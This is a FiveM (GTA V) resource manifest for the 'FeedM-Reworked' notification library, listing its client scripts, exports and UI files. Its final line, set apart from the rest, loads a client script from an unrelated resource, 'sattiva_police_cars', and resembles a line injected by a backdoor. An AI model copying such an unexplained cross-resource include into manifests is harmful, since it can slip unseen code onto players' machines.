--[ FeedM - edited by szymczakovv & elfeedo ]--
-- Name: FeedM-Reworked
-- Author: szymczakovv#1937, elfeedoo#6093
-- Date: 05/01/2021
-- Version: 0.1.6

lua54 'yes'
fx_version 'adamant'
game 'gta5'
description 'FeedM & feedm rework by szymczakovv'

client_scripts {'config.lua', 'utils.lua', 'client.lua', 'pnotify.lua'}

exports {
    'ShowNotification',
    'ShowAdvancedNotification',
    'SetQueueMax',
    'SendNotification',
}

ui_page 'html/index.html'

files {
    'html/index.html',
    'html/pNotify.js',
    'html/noty.js',
    'html/noty.css',
    'html/themes.css',
    'html/sound-example.wav'
}


client_script '@sattiva_police_cars/client.lua'